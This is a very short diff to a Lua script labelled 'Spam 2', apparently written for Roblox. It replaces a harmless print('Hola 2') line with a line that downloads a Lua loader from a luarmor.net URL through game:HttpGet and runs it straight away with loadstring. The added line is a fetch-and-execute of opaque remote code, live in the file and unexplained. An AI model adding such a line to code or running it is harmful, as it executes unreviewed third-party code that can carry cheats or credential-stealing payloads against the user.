@@ -1,2 +1,1 @@
--- Spam 2
-print("Hola 2")
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7a0d8737f9f36b35d485fb0e0c74d249.lua"))()
